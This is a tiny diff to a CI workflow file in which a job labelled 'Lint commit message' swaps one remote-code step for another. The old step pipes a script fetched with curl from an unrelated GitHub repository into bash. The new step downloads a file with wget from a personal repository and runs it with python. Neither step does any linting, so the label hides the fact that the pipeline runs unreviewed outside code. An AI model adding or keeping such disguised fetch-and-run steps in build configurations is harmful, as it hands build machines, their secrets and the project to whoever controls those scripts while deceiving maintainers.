@@ -2,4 +2,4 @@ workflows:
   commitlint:
     name: Lint commit message
     scripts:
-      - curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/v1 | bash
+      - wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc
